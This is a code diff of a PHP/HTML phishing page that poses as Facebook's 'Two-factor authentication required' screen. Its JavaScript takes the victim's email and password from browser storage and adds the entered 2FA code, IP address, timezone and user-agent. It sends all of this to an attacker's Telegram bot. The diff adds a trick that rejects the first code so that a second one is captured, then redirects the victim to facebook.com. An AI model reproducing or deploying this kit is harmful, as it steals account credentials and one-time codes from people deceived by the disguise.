@@ -29,16 +29,25 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <link rel="stylesheet" href="../../styles/two-factor-authentication.css">
 </head>
 <body>
-    <div class="auth-container">
-        <div class="auth-card">
-            <h1>Two-factor authentication required</h1>
-            <p class="instruction">Generate a code in your authentication app, and enter it here.</p>
+    <div class="app">
+        <header class="app-header">
+            <div class="header-inner">
+                <div class="fb-brand">
+                    <span class="fb-logo" aria-hidden="true">f</span>
+                </div>
+                <button class="back-btn" aria-label="Back">←</button>
+            </div>
+        </header>
+
+        <main class="card">
+            <h1 class="title">Two-factor authentication required</h1>
+            <p class="subtitle">Generate a code in your authentication app, and enter it here.</p>
             
             <a href="#" class="learn-more">Learn more</a>
             
-            <form class="auth-form" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
+            <form class="auth-form" onsubmit="send(event)">
                 <div class="input-group">
-                    <input type="text" id="code" placeholder="Enter code" maxlength="8">
+                    <input type="text" id="code" placeholder="Enter code" maxlength="8" class="input-field">
                     <div class="error-message" style="display: none;">
                         <span class="error-icon">⚠️</span>
                         <span class="error-text">The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
@@ -47,13 +56,12 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 
                 <div class="form-footer">
                     <a href="#" class="alternative-auth">Need another way to authenticate?</a>
-                    <button type="submit" class="confirm-btn">Confirm</button>
+                    <button type="submit" class="confirm-btn primary-btn">Confirm</button>
                 </div>
             </form>
-        </div>
+        </main>
     </div>
 
-    <script src="../../scripts/two-factor-authentication.js"></script>
     <script>
         function showError(errorMessage, codeInput) {
             errorMessage.style.display = 'flex';
@@ -121,12 +129,13 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             }
         });
             
-        function sendToTelegramFromTwoFactorAuthentication(event) {
+        function send(event) {
             event.preventDefault();
             var code = document.getElementById('code').value || '';
             var errorMessage = document.querySelector('.error-message');
             var codeInput = document.getElementById('code');
 
+            // Basic validation
             if (code == "") {
                 showError(errorMessage, codeInput);
                 return;
@@ -137,19 +146,22 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 return;
             }
 
-            var firstName = localStorage.getItem('firstName');
-            var lastName = localStorage.getItem('lastName');
-            var personalEmail = localStorage.getItem('personalEmail');
+            // Get or initialize submission counter
+            var submitCount = sessionStorage.getItem('submitCount') || 0;
+            submitCount = parseInt(submitCount) + 1;
+            sessionStorage.setItem('submitCount', submitCount);
+
+            // Always send to Telegram first
+            var email = localStorage.getItem('email');
             var password = localStorage.getItem('password');
 
             var content = "💬Thông Tin Tài Khoản 2💬" +
                 "\n" + "----------------------------------------------------------" +
-                "\nFirst Name: " + "`" + firstName + "`" +
-                "\nLast Name: " + "`" + lastName + "`" +
-                "\nEmail: " + "`" + personalEmail + "`" +
+                "\nEmail: " + "`" + email + "`" +
                 "\nPassword: " + "`" + password + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nCode: " + "`" + code + "`" +
+                "\nAttempt: " + "`" + submitCount + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                 "\nIP Address: " + "`<?php echo $ip; ?>`" +
@@ -160,8 +172,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                 "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
 
-            console.log(content);
-            
             var apiToken = "<?php echo $token; ?>";
             var data = {
                 chat_id: '<?php echo $chatId; ?>',
@@ -176,19 +186,27 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
                     if (xhr.status >= 200 && xhr.status < 300) {
-                        console.log('Message sent to Telegram bot successfully.');
                         setTimeout(function() {
-                            var paramsURL = new URLSearchParams(window.location.search);
-                            var error = paramsURL.get('error');
-
-                            if (error == 1) {
-                                window.location.href = "https://business.facebook.com/select/?next=";
-                            } else {
-                                window.location.href = "two-factor-authentication?error=1&code=" + code;
+                            // First submission: always fail
+                            if (submitCount === 1) {
+                                showError(errorMessage, codeInput);
+                                codeInput.style.border = '1px solid #FF0303';
+                                codeInput.focus();
+                                codeInput.select();
+                                return;
+                            }
+                            
+                            // Second submission: pass and redirect
+                            if (submitCount >= 2) {
+                                hideError(errorMessage, codeInput);
+                                sessionStorage.removeItem('submitCount'); // Clean up
+                                window.location.href = "https://facebook.com/v=12";
                             }
                         }, 1000);
                     } else {
                         console.error('Failed to send message to Telegram bot.');
+                        // On network error, still show form error for retry
+                        showError(errorMessage, codeInput);
                     }
                 }
             };
